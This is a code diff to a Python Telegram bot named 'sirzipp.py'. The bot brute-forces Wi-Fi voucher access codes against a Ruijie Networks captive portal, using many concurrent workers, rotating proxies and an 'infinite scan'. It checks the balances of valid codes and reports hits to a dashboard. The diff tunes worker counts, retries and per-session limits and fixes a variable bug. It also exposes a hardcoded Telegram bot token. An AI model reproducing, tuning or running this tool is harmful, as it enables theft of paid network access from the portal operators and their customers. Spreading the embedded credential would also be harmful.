@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # =====================================================================================
 #  sirzipp.py — FINAL VERSION
-#  Speed Optimized (10 Workers) + Infinite Scan + CURRENT_CODE Fix
+#  CURRENT_CODE KeyError Fix + Infinite Scan
 # =====================================================================================
 
 import os
@@ -30,10 +30,10 @@ BOT_TOKEN = "8810710930:AAFf_yQc4WBJlVk9nk9yDQuJsqfyjCGOVL8"
 
 PORTAL_URL_PATH = "portal_url_"
 PROXY_FILE = "proxies.txt"
-MAX_CODES_PER_SESSION = 30
-MAX_CODES_PER_SID = 30           # ⭐ SID အသစ် မြန်မြန်ရှာ
-NUM_WORKERS = 100                   # ⭐ Worker ၁၀ ခု
-TIMEOUT_SEC = 15                   # ⭐ Timeout ၁၅ စက္ကန့်
+MAX_CODES_PER_SESSION = 999999999
+MAX_CODES_PER_SID = 30
+NUM_WORKERS = 50
+TIMEOUT_SEC = 30
 
 ADMIN_IDS = [6537847588]
 
@@ -212,7 +212,7 @@ async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
 
 # ── BALANCE ──────────────────────────────────────────────────────────────────
 
-async def fetch_balance(active_token, code, retries=3, proxy=None):
+async def fetch_balance(active_token, code, retries=5, proxy=None):
     url = BALANCE_URL + active_token + "?lang=en_US"
     headers = {
         "authority": "portal-as.ruijienetworks.com",
@@ -268,7 +268,7 @@ async def fetch_balance(active_token, code, retries=3, proxy=None):
     return "N/A"
 
 
-# ── CHECK SINGLE CODE (Optimized) ────────────────────────────────────────────
+# ── CHECK SINGLE CODE ────────────────────────────────────────────────────────
 
 async def check_single_access_code(session, code, current_session_id,
                                    login_url, captcha_base_url, verify_url,
@@ -329,12 +329,12 @@ async def check_single_access_code(session, code, current_session_id,
             ud["stats"]["limit_codes"].append(code)
             return
         retry_count += 1
-        if retry_count >= 1:   # ⭐ Retry ၂ ခါပဲ
+        if retry_count >= 3:
             return
-        await asyncio.sleep(0.001)
+        await asyncio.sleep(0.01)
 
 
-# ── WORKER (Optimized - No Sleep) ────────────────────────────────────────────
+# ── WORKER (Infinite Loop) ───────────────────────────────────────────────────
 
 async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
     ud = get_user_data(user_id)
@@ -357,11 +357,11 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                         sid_failures = 0
                     else:
                         sid_failures += 1
-                        if sid_failures >= 20:
-                            await asyncio.sleep(1)
+                        if sid_failures >= 50:
+                            await asyncio.sleep(5)
                             sid_failures = 0
                             continue
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(1)
                         continue
                 if ud["stop_event"].is_set():
                     break
@@ -376,7 +376,7 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                     continue
                 ud["stats"]["tried_codes"].add(code)
                 ud["CURRENT_CODE"] = code
-                # ⭐ sleep ဖျက်လိုက်ပါပြီ
+                await asyncio.sleep(0.001)
                 await check_single_access_code(session, code, current_session_id,
                                                login_url, captcha_base_url,
                                                verify_url, headers, user_id, proxy=proxy)
@@ -384,10 +384,11 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                 codes_checked_this_session += 1
 
 
-# ── RUN SCANNER ──────────────────────────────────────────────────────────────
+# ── RUN SCANNER (CURRENT_CODE Fix) ───────────────────────────────────────────
 
 async def run_user_scanner(context, user_id):
     ud = get_user_data(user_id)
+    # ⭐ CURRENT_CODE ကို ဒီနေရာမှာ သတ်မှတ် (try block ရဲ့ အပြင်)
     ud["CURRENT_CODE"] = "----"
     try:
         ud["stats"] = {
@@ -421,7 +422,7 @@ async def run_user_scanner(context, user_id):
             if all(t.done() for t in worker_tasks):
                 break
 
-            if time.time() - last_update >= 10:
+            if time.time() - last_update >= 3:
                 last_update = time.time()
                 stats = ud["stats"]
                 elapsed = time.time() - stats["start_time"]
@@ -452,7 +453,7 @@ async def run_user_scanner(context, user_id):
                         context.bot.edit_message_text(
                             chat_id=user_id, message_id=ud["dash_msg_id"],
                             text=text, reply_markup=InlineKeyboardMarkup(keyboard)),
-                        timeout=15.0
+                        timeout=10.0
                     )
                     print(f"[DASHBOARD] Updated: tried={stats['tried']}, hits={len(stats['valid_codes'])}")
                 except asyncio.TimeoutError:
